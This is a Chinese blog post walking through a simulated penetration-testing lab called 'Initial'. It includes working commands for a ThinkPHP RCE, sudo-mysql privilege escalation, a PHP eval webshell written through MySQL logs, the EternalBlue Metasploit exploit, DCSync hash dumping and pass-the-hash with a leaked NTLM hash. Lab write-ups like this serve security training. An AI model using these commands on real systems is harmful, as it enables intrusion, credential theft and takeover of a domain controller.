---
title: 春秋云镜-【仿真场景】Initial writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17187356.html
source: 博客园 - 渗透测试中心
date: 2023-03-08
fetch_date: 2025-10-04T08:55:16.731993
---

# 春秋云镜-【仿真场景】Initial writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [春秋云镜-【仿真场景】Initial writeup](https://www.cnblogs.com/backlion/p/17187356.html "发布于 2023-03-07 11:07")

开启靶机后是一个带着 ThinkPHP icon 的登陆界面，直接测试一下

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110636048-1565814497.png)

存在 5.0.23 RCE

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110637540-1801706103.png)

打一下，PHP-7.4.3 的环境，看一下 disable\_functions

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110639547-1250749297.png)

传马上去，蚁剑连接，是`www-data`权限，那么就得想办法提权进到`/root`下

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110640661-1844543318.png)

在以前关注的公众号下找了些文章，**Web安全工具库** 这篇写的挺全的，[《Linux提权备忘录》](https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg "《Linux提权备忘录》")

尝试`cat /etc/sudoers`被告知`Permission denied`，换成`sudo -l`查看

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110641549-1648796767.png)

这个[网站](https://gtfobins.github.io/ "网站")里可以提供命令提权参考

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110642695-1169510790.png)

可以使用`mysql`来实现，`sudo mysql -e '! cat /root/flag/flag01.txt'`拿到第一部分 flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110643795-1554936812.png)

`ifconfig`查下 IP

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110644672-297605697.png)

把 fscan 传上去然后扫下 C 段，`./fscan_amd64 -h 172.22.1.1/24`，结果在当下的 result.txt 里

```
172.22.1.18:3306 open
172.22.1.2:88 open
172.22.1.21:445 open
172.22.1.18:445 open
172.22.1.2:445 open
172.22.1.21:139 open
172.22.1.18:139 open
172.22.1.2:139 open
172.22.1.21:135 open
172.22.1.18:135 open
172.22.1.2:135 open
172.22.1.18:80 open
172.22.1.15:80 open
172.22.1.15:22 open
[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)
[+] 172.22.1.21 MS17-010    (Windows 7 Professional 7601 Service Pack 1)
[+] NetInfo:
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[+] NetInfo:
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[+] NetInfo:
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[*] 172.22.1.2     [+]DC XIAORANG\DC01              Windows Server 2016 Datacenter 14393
[*] WebTitle:http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
[*] 172.22.1.18          XIAORANG\XIAORANG-OA01     Windows Server 2012 R2 Datacenter 9600
[*] 172.22.1.21          __MSBROWSE__\XIAORANG-WIN7     Windows 7 Professional 7601 Service Pack 1
[*] WebTitle:http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle:http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
```

.15 就不用看了，.21 是个存在永恒之蓝的 Win7，.18 是个信呼OA 的系统，.2 是个域控

用 NPS+Proxifier 代理转发，先看 .18

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110646001-553558510.png)

然后就有两个做法，第一个是针对信呼OA的一个文件上传漏洞，可以参考 [Y4tacker师傅的文章](https://blog.csdn.net/solitudi/article/details/118675321 "Y4tacker师傅的文章")，在利用弱口令 admin/admin123 登录后直接打 exp 就行

第二种做法是在扫目录基础上，利用`/phpmyadmin`，可以直接 root/root 登录，然后利用日志写入 webshell

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110647154-626882643.png)

第一步先执行`show variables like 'general%';`查看是否开启日志以及存放的日志位置

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110648017-198648864.png)

第二步`set global general_log = ON;`开启日志

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110648952-407549277.png)

第三步`set global general_log_file`设置日志保存位置

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110650068-1078672261.png)

最后`select '<?php eval($_POST[cmd]);?>';`写然后蚁剑连接，flag 就在`C:/Users/Administrators/flag`下

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110650881-1743691686.png)

接下来看 .21，是台 Win7 的机子，可以打 MS17-010 ，试了一下不出网，采用正向监听即可

先挂代理，`proxychains msfconsole`走 socks5 流量，然后依次`use exploit/windows/smb/ms17_010_eternalblue`=>`set payload windows/x64/meterpreter/bind_tcp_uuid`=>`set RHOSTS 172.22.1.21`=>`exploit`

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110651877-206534028.png)

得到正向的 meterpreter shell 后，接下来就是利用 DCSync

DCSync的介绍可以参考[这篇文章](https://www.cnblogs.com/CoLo/p/16488892.html "这篇文章")，最大的特点就是可以实现不登录到域控而获取域控上的数据

在 MSF 下直接`load kiwi`，然后`kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit`导出域内所有用户的 Hash

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110652987-805989077.png)

之前扫出来 .2 的 445 端口开放，利用 smb 哈希传递，直接用 kali 自带的 crackmapexec，`proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "$cmd"`，最后一部分 flag 在`/Users/Administrators/flag`下

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110654331-1308499591.png)

原文链接： <http://119.45.47.125/index.php/2022/11/24/yunjing-4/>

posted @
2023-03-07 11:07
[渗透测试中心](https://www.cnblogs.com/backlion)
阅读(597)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025